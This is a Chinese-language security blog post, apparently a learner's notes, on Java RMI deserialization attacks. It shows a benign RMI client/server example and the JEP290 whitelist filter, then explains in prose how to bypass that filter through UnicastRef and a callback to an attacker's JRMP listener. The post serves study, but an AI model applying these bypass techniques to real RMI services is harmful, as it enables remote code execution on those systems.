@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Java RMI反序列化与JNDI注入入门本来是想更新原文章的，但是学着学着发现自己之前根本没懂，写了一万个错的东西，全部推倒重来真正的java漏洞分析都是无尽的代码截图和调试，我这种纯概念的文字叙述只能是记个笔记，先了解各大概 RMI反序列化主要是利用客户端，服务端以及注册中心交互过程中对象的传递进行反序列化 名词解释">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java RMI反序列化与JNDI注入入门">
+<meta property="og:url" content="https://blog.z3ratu1.cn/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="Java RMI反序列化与JNDI注入入门本来是想更新原文章的，但是学着学着发现自己之前根本没懂，写了一万个错的东西，全部推倒重来真正的java漏洞分析都是无尽的代码截图和调试，我这种纯概念的文字叙述只能是记个笔记，先了解各大概 RMI反序列化主要是利用客户端，服务端以及注册中心交互过程中对象的传递进行反序列化 名词解释">
+<meta property="og:locale">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/structure.png">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/unmarshalValue.png">
+<meta property="og:image" content="https://blog.z3ratu1.cn/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/isPrimitive.png">
+<meta property="article:published_time" content="2021-04-13T11:57:58.000Z">
+<meta property="article:modified_time" content="2021-12-01T13:21:40.042Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="RMI">
+<meta property="article:tag" content="JNDI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.z3ratu1.cn/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/structure.png">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Java RMI反序列化与JNDI注入入门 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java RMI反序列化与JNDI注入入门
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-13 19:57:58" itemprop="dateCreated datePublished" datetime="2021-04-13T19:57:58+08:00">2021-04-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-01 21:21:40" itemprop="dateModified" datetime="2021-12-01T21:21:40+08:00">2021-12-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html" class="post-meta-item leancloud_visitors" data-flag-title="Java RMI反序列化与JNDI注入入门" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Java-RMI反序列化与JNDI注入入门"><a href="#Java-RMI反序列化与JNDI注入入门" class="headerlink" title="Java RMI反序列化与JNDI注入入门"></a>Java RMI反序列化与JNDI注入入门</h1><p>本来是想更新原文章的，但是学着学着发现自己之前根本没懂，写了一万个错的东西，全部推倒重来<br>真正的java漏洞分析都是无尽的代码截图和调试，我这种纯概念的文字叙述只能是记个笔记，先了解各大概</p>
+<h2 id="RMI反序列化"><a href="#RMI反序列化" class="headerlink" title="RMI反序列化"></a>RMI反序列化</h2><p>主要是利用客户端，服务端以及注册中心交互过程中对象的传递进行反序列化</p>
+<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>没什么用的环节。Remote Method Invocation，远程方法调用<br>JRMP，Java Remote Method Protocol，Java远程方法协议，是Java RMI过程中使用的一种协议</p>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>项目结构如下<br><img src="/images/JavaRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/structure.png" alt="structure.png"><br>一般来说RMI中有三个主要成员，Server，Client和Registry，Registry提供一个记录和注册的服务，Server负责注册在Registry上方法的具体实现，而Client就只需要查找Registry中的方法然后调用。</p>
+<p>理论上Server和Registry是可以分开的，不过在jdk某个版本之后进行了安全检查，要求注册中心和服务端是同一台机器，否则不给绑定</p>
+<p>客户端只需要知道远程提供服务的路径，通过list，lookup等方法去获取一个远程调用的类对象的代理类，对代理类进行方法调用，就转换到将类名方法参数传递到服务端，由服务端查找类方法并进行调用，最后返回得到的结果</p>
+<p>整个调用的过程就是服务端运行一个Skeleton（骨架），类的实现之类的都在服务端，而客户端进行远程方法调用的时候，服务端就返回一个Stub（存根），实际上返回的是远程调用类的一个代理对象，其invoke方法就是将参数进行一个序列化，然后发到服务端，服务端收到参数后在本地执行对应的方法，并将执行结果返回给客户端</p>
+<h3 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h3><p>HelloClient.java</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>client<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>HelloInterface<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloClient</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            HelloInterface hello <span class="token operator">=</span> <span class="token punctuation">(</span>HelloInterface<span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"z33"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotBoundException</span> <span class="token operator">|</span> RemoteException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>HelloServer.java</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>server<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServer</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server ready"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> <span class="token operator">|</span> AlreadyBoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>HelloImpl.java</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>server<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>HelloInterface<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 实现接口</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">HelloInterface</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string">"sayHello"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>HelloInterface.java</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>z33<span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 客户端只需要接口，远程调用服务端的实现，接口必须在同一个package下</span>
+<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">HelloInterface</span> <span class="token keyword">extends</span> <span class="token class-name">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这里有一个小坑，就是Client和Server的Interface的完全限定名需要一直，之前在server下写了一个HelloInterface又在client下写了个一样的，但是分别在不同包下就没法类型转换过去，调用不了，最后就直接把实现留一个留在com.z33这个package下了</p>
+<p>慢慢把各种攻击方式都本地搭个最简单的复现吧。。。</p>
+<h3 id="攻击registry"><a href="#攻击registry" class="headerlink" title="攻击registry"></a>攻击registry</h3><p>对注册中心的攻击方式</p>
+<h4 id="bind-amp-rebind"><a href="#bind-amp-rebind" class="headerlink" title="bind &amp; rebind"></a>bind &amp; rebind</h4><p>对注册中心调用bind和rebind的时候，是会对输入的对象进行反序列化的，因此直接在bind和rebind时发送一个恶意对象即可。不过在<code>jdk6u141</code>，<code>jdk7u131</code>，<code>jdk8u121</code>中加入了JEP290限制，进行了过滤，只允许白名单内的类反序列化，白名单如下所示，常见的利用链均不会在白名单之中，需要另辟蹊径。<strong>该白名单仅影响Registry的几个方法，因此客户端与服务端之间互相攻击仍然不受影响</strong><br>又，在jdk8u141及其之后对bind和rebind请求进行了检查，只允许本地发起的bind请求，即便使用之后提到的绕过白名单的打法进行攻击也会因为不是本地请求而失败，因此bind打法基本不适用，需要jdk版本较为古老</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> clazz
+        <span class="token operator">||</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>activation<span class="token punctuation">.</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
+        <span class="token operator">||</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> ObjectInputFilter<span class="token punctuation">.</span>Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> ObjectInputFilter<span class="token punctuation">.</span>Status<span class="token punctuation">.</span>REJECTED<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h4 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h4><p>lookup因为是查registry，所以不会有刚才提到的限制，但lookup默认传递的是字符串，因为是查询名字对应的方法，传递的不是对象，但server对传递过来的对象即使是string类型也得反序列化，因此魔改lookup函数或是简单的复现其流程，发送一个object，或是通过java agent，rasp等方法注入程序替换序列化数据即可通过lookup攻击registry。</p>
+<blockquote>
+<p>rmb神仙和我说RMI的通信过程和HTTP差不多，都是发一个应答一个，交互基本上就一次性的，所以也可以手搓流量（大概）进行攻击，但是有一些objid之类的东西是随机的？所以需要额外的操作</p>
+</blockquote>
+<h4 id="jdk8u121之前"><a href="#jdk8u121之前" class="headerlink" title="jdk8u121之前"></a>jdk8u121之前</h4><p>lookup也好，bind rebind也好，都可以直接发一个能用的链直接一键打穿，这是最快乐的年代</p>
+<h4 id="jdk8u121-8u232-b09"><a href="#jdk8u121-8u232-b09" class="headerlink" title="jdk8u121~8u232_b09"></a>jdk8u121~8u232_b09</h4><p>由于上文提到的类过滤，直接反序列化链的payload会因为不在白名单类中而失效，这时就需要想办法从白名单类中绕出来<br>这里使用的是允许的类中的Remote类和UnicastRef类<br>代码太高深，暂时还不是很懂，具体过程是通过控制UnicastRef对象中的LiveRef的属性，发起任意RMI连接，从而连接到恶意的server上，而RMI中传递的对象需要实现Remote接口，因此还需要用Remote类下的RemoteObjectInvocationHandler，调用其父类RemoteObject的readObject函数，而其中又调用了其ref属性的readExternal方法，这里的ref属性就是我们之前控制的UnicastRef类，抄一个函数介绍</p>
+<blockquote>
+<p>Java默认的序列化机制非常简单，而且序列化后的对象不需要再次调用构造器重新生成，但是在实际中，我们可以会希望对象的某一部分不需要被序列化，或者说一个对象被还原之后，其内部的某些子对象需要重新创建，从而不必将该子对象序列化。 在这些情况下，我们可以考虑实现Externalizable接口从而代替Serializable接口来对序列化过程进行控制。<br>Externalizable接口extends Serializable接口，而且在其基础上增加了两个方法：writeExternal()和readExternal()。这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊的操作。</p>
+</blockquote>
+<p>在这里readExternal就用ref的ip port一路发起tcp连接并调用一个lookup函数，从而连接到传说中的JRMPListener</p>
+<h5 id="JRMP-Listener-amp-amp-JRMP-Client"><a href="#JRMP-Listener-amp-amp-JRMP-Client" class="headerlink" title="JRMP Listener &amp;&amp; JRMP Client"></a>JRMP Listener &amp;&amp; JRMP Client</h5><p>yso中JRMP不仅分为Listener和Client，还分为payload和exploit，排列组合就等于有四个类型。两两一组形成两种利用模式<br>payload&#x2F;listener+expolit&#x2F;client和payload&#x2F;client+expolit&#x2F;listener</p>
+<p>前者通过发送一个反序列化链，使得目标机器启动一个RMI服务监听，然后利用JRMP client发送一个链进行利用</p>
+<p>后者通过发送一个反序列化链，使得目标机器反过来对攻击者的JRMP listener发起RMI连接，并通过listener返回一个恶意的链进行攻击</p>
+<p>上文提到的白名单绕过，就是使用JRMP Client绕过白名单，让目标对攻击者服务器发送RMI连接（调用lookup函数），此时绕过了对JEP290反序列化类的限制，再从无限制的RMI方法调用中返回真正的payload打穿。<br>JRMP Listener在RMI连接可控时，能稳定打一个反序列化，其可以通过返回一个ExceptionalReturn状态，在Client处理该状态时，会直接对返回的数据进行反序列化，从而打通。<br>这个方案不仅适用于lookup函数，在client进行远程方法调用等场合，无论返回值为何种类型，均可以返回该异常类型进行反序列化</p>
